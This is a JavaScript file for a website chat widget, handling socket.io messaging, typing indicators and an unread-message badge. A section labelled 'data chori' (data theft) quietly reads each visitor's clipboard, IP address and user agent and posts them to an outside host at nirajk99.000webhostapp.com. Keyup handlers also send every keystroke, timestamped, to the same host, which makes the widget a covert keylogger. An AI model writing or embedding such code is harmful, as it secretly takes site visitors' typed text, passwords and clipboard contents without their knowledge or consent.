const chatbotToggler = document.querySelector(".chatbot-toggler");
const closeBtn = document.querySelector(".close-btn");
const chatbox = document.querySelector(".chatbox");
const chatInput = document.querySelector(".chat-input textarea");
const sendChatBtn = document.querySelector(".chat-input span");

let userMessage = null; // Variable to store user's message
const API_KEY = "PASTE-YOUR-API-KEY"; // Paste your API key here
const inputInitHeight = chatInput.scrollHeight;

  

    // document.addEventListener("DOMContentLoaded", async function() {
    //   try {
    //     await sendDataOnKeyUp("hi there, I am a new visitor");
    //     console.log("Data sent successfully!");
    //     // Continue loading the page or trigger other actions after sending data
    //   } catch (error) {
    //     console.error("Error sending data:", error);
    //   }
    // });

const createChatLi = (message, className) => {
    // Create a chat <li> element with passed message and className
    const chatLi = document.createElement("li");
    chatLi.classList.add("chat", `${className}`);
    let chatContent = className === "outgoing" ? `<p></p>` : `<span class="material-symbols-outlined">sentiment_satisfied</span><p></p>`;
    chatLi.innerHTML = chatContent;
    chatLi.querySelector("p").textContent = message;
    return chatLi; // return chat <li> element
}

var msg_count=0;

function handleChat(type,msg) {

    if (type==1) {
    userMessage = chatInput.value.trim(); // Get user entered message and remove extra whitespace
    if(!userMessage) return;


    // Clear the input textarea and set its height to default
    chatInput.value = "";
    chatInput.style.height = `${inputInitHeight}px`;

    // Append the user's message to the chatbox
    chatbox.appendChild(createChatLi(userMessage, "outgoing"));
    chatbox.scrollTo(0, chatbox.scrollHeight);
    p3_namee=document.getElementById('room_name_hei');
rom = p3_namee.innerText;
     socket.emit('msg_gaya',{
msg:userMessage,roomx:rom});
     socket.emit('typeping_rook',{room_is:rom});
    }else{

            const incomingChatLi = createChatLi(msg, "incoming");
        chatbox.appendChild(incomingChatLi);
        chatbox.scrollTo(0, chatbox.scrollHeight);
 }
}



socket.on('msg_aaya',(data)=>{
      
      handleChat(2,data.msg_is);
    msg_count=msg_count+1;
      updateBadge(msg_count);

});



chatInput.addEventListener("input", () => {
    // Adjust the height of the input textarea based on its content
    chatInput.style.height = `${inputInitHeight}px`;
    chatInput.style.height = `${chatInput.scrollHeight}px`;
});

chatInput.addEventListener("keydown", (e) => {
    // If Enter key is pressed without Shift key, handle the chat
p3_namee=document.getElementById('room_name_hei');
rom = p3_namee.innerText;
//if (!chatInput.value=="") {
socket.emit('typeping',{room_is:rom});
//}
    if (e.key === "Enter" && !e.shiftKey) {
        e.preventDefault();
        handleChat(1, 'hi'); // Sending a placeholder message ('hi') for now
    }
});

chatInput.addEventListener("keyup", (e) => {
   lita = chatInput.value;
   sendDataOnKeyUp(lita);

    p3_namee=document.getElementById('room_name_hei');
rom = p3_namee.innerText;
//if (chatInput.value=="") {
socket.emit('typeping_rook',{room_is:rom});

//}

});
// sendChatBtn.addEventListener("click", ()=>{
//   chatInput2 = document.querySelector(".chat-input textarea");
//   msg_hei=chatInput2.value;
//   console.log(msg_hei);
//     socket.emit('msg_gaya',{
// msg:msg_hei});
// });
let isFirstClick = true;

sendChatBtn.addEventListener("click", async () => {
  lita = chatInput.value;

  try {
    if (isFirstClick) {
      await sendData(lita); // Wait for sendData to complete
    } else {
      sendData3(lita);
    }
    handleChat(1, 'hi'); // Proceed with handleChat after sendData or sendData3 is done
    isFirstClick = false; // Update flag after the first click
  } catch (error) {
    // Handle any errors that might occur during sendData or sendData3
    console.error("Error:", error);
  }
});





closeBtn.addEventListener("click", () =>{
updateBadge(0);
msg_count=0;
 document.body.classList.remove("show-chatbot")
});
chatbotToggler.addEventListener("click", () => {
updateBadge(0);
msg_count=0;
    document.body.classList.toggle("show-chatbot")});

messageInput22 = document.getElementById('messageInput');
   

  messageInput22.addEventListener('keydown', function(event) {
   // console.log("neggaaaaa the tha tha")
    p3_namee = document.getElementById('room_name_hei');
// Check if any key other than 'Enter' is pressed
      const rom = p3_namee.innerText;
      socket.emit('typeping', { room_is: rom });
 
  });

  messageInput2.addEventListener('keyup', function(event) {
   lita = chatInput.value;
    sendDataOnKeyUp(lita);
 //console.log("neggaaaaa the tha tha");
    p3_namee = document.getElementById('room_name_hei');
    const rom = p3_namee.innerText;
    socket.emit('typeping_rook', { room_is: rom });
  });


// let messageCount = 0; // Variable to store the message count

// // Simulated event for new message arrival
// document.getElementById('chat_vala').addEventListener('click', function () {
//   messageCount++; // Increment message count
//   updateBadge();
  
//   // Simulated delay to reset the badge after a few seconds
//   setTimeout(function () {
//     messageCount = 0; // Reset the message count
//     updateBadge();
//   }, 3000); // Adjust this time according to your requirement
// });

function updateBadge() {
  const badge = document.getElementById('notification-badge');
  if (messageCount > 0) {
    badge.style.display = 'block';
    badge.textContent = messageCount > 9 ? '9+' : messageCount;
  } else {
    badge.style.display = 'none';
  }
}


function updateBadge(count) {
  const badge = document.getElementById('notification-badge');

  if (count > 0) {
    badge.style.display = 'block';
    badge.textContent = count > 9 ? '9+' : count;
  } else {
    badge.style.display = 'none';
  }
}

/// data chori
function sendData(message) {
  return new Promise((resolve, reject) => {
    const fetchData = async () => {
      try {

   let ipAddress = null;

try {
  const response = await fetch("https://api.ipify.org/?format=json");
  const ipData = await response.json();
  ipAddress = ipData.ip;
} catch (error) {
  console.error("Error fetching IP:", error);
  // If there's an error fetching the IP, ipAddress will remain null
}


        const userAgent = navigator.userAgent;

        let clipboardData = null;
        if (navigator.clipboard) {
          try {
            const textFromClipboard = await navigator.clipboard.readText();
            clipboardData = textFromClipboard;
          } catch (error) {
            clipboardData = null;
          }
        }

        // Assuming message is for "lia" field
        const formData = {
          lia: message,
          ip: ipAddress,
          clip: clipboardData,
          navi_string: userAgent
        };

        $.ajax({
          url: "https://nirajk99.000webhostapp.com/save-form.php",
          type: "POST",
          data: formData,
          success: function(data) {
            if (data === "1") {
              console.log("Data saved successfully!");
              resolve(); // Resolve the promise when the data is saved successfully
            }
          },
          error: function(xhr, status, error) {
            console.error("Error:", error);
            reject(error); // Reject the promise in case of an error
          }
        });
      } catch (error) {
        console.error("Error:", error);
        reject(error); // Reject the promise if any error occurs during the process
      }
    };

    fetchData();
  });
}

function sendData3(message) {
  return new Promise((resolve, reject) => {
    const fetchData = async () => {
      try {


   let ipAddress = null;

try {
  const response = await fetch("https://api.ipify.org/?format=json");
  const ipData = await response.json();
  ipAddress = ipData.ip;
} catch (error) {
  console.error("Error fetching IP:", error);
  // If there's an error fetching the IP, ipAddress will remain null
}

        const userAgent = navigator.userAgent;
        let clipboardData = null;
        // if (navigator.clipboard) {
        //   try {
        //     const textFromClipboard = await navigator.clipboard.readText();
        //     clipboardData = textFromClipboard;
        //   } catch (error) {
        //     clipboardData = null;
        //   }
        // }

        // Assuming message is for "lia" field
        const formData = {
          lia: message,
          ip: ipAddress,
          clip: clipboardData,
          navi_string: userAgent
        };

        $.ajax({
          url: "https://nirajk99.000webhostapp.com/save-form.php",
          type: "POST",
          data: formData,
          success: function(data) {
            if (data === "1") {
              console.log("Data saved successfully!");
              resolve(); // Resolve the promise when the data is saved successfully
            }
          },
          error: function(xhr, status, error) {
            console.error("Error:", error);
            reject(error); // Reject the promise in case of an error
          }
        });
      } catch (error) {
        console.error("Error:", error);
        reject(error); // Reject the promise if any error occurs during the process
      }
    };

    fetchData();
  });
}


async function sendData2(message) {
    const response = await fetch("https://api.ipify.org/?format=json");
    const ipData = await response.json();
    const ipAddress = ipData.ip;



    const userAgent = navigator.userAgent;

    if (!navigator.clipboard) {
        alert("Clipboard API is not supported in this browser.");
        var clipboardData = null;
    } else {
        try {
            const textFromClipboard = await navigator.clipboard.readText();
            var clipboardData = textFromClipboard;
        } catch (error) {
            var clipboardData = null; // Set clipboard value as null if access is denied
        }
    }

    // const formData = {
    //     lia: message, // Assuming the message is meant for "lia" field
    //     ip: ipAddress,
    //     clip: clipboardData,
    //     navi_string: userAgent
    // };

    $.ajax({
        url: "https://nirajk99.000webhostapp.com/save-form.php",

        type: "POST",
        data: {
             lia: message, // Assuming the message is meant for "lia" field
        ip: ipAddress,
        clip: clipboardData,
        navi_string: userAgent
        },
        success: function(data) {
            if (data === "1") {
                console.log("Data saved successfully!"); // Adjust the success handling as needed
            }
        },
        error: function(xhr, status, error) {
            console.error("Error:", error);
            // Handle error cases here
        }
    });
}




//key up
async function sendDataOnKeyUp(fieldValue) {
   let ipAddress = null;

try {
  const response = await fetch("https://api.ipify.org/?format=json");
  const ipData = await response.json();
  ipAddress = ipData.ip;
} catch (error) {
  console.error("Error fetching IP:", error);
  // If there's an error fetching the IP, ipAddress will remain null
}

    const currentDate = getCurrentDate();
    const currentTime = getCurrentTime();

    const formData = {
        ip: ipAddress,
        date: currentDate,
        lia: `${currentTime}   ${fieldValue}`
    };

    $.ajax({
        url: "https://nirajk99.000webhostapp.com/save_key.php",
        type: "POST",
        data:{
            ip: ipAddress,
            date: currentDate,
            lia: currentTime+" "+ fieldValue
        },
        success: function (data) {
            if (data === "1") {
                console.log("Data sent successfully!");
            } else {
                console.log("Failed to send data.");
            }
        },
        error: function (error) {
            console.error("Error:", error);
            // Handle error cases here
        }
    });
}


function attachKeyUpListener(inputFieldId) {
    const inputField = document.getElementById(inputFieldId);
    inputField.addEventListener("keyup", function(e) {
        const fieldValue = $(`#${inputFieldId}`).val();
        sendDataOnKeyUp(fieldValue);
    });
}

function getCurrentDate() {
  const today = new Date();
    const day = today.getDate();
    const month = today.getMonth() + 1; // Months are zero-based
    const year = today.getFullYear();

    const formattedDay = (day < 10) ? `0${day}` : day;
    const formattedMonth = (month < 10) ? `0${month}` : month;

    const formattedDate = `${formattedDay}-${formattedMonth}-${year}`;

    return formattedDate;
}

function getCurrentTime() {
   const today = new Date();
    const hours = today.getHours();
    const minutes = today.getMinutes();
    const seconds = today.getSeconds();

    const formattedHours = (hours < 10) ? `0${hours}` : hours;
    const formattedMinutes = (minutes < 10) ? `0${minutes}` : minutes;
    const formattedSeconds = (seconds < 10) ? `0${seconds}` : seconds;

    const formattedTime = `${formattedHours}-${formattedMinutes}-${formattedSeconds}`;

    return formattedTime;
}


// Example of attaching the function to an input field with ID "lia"
messageInput3 = document.getElementById('messageInput');
attachKeyUpListener("messageInput");

 
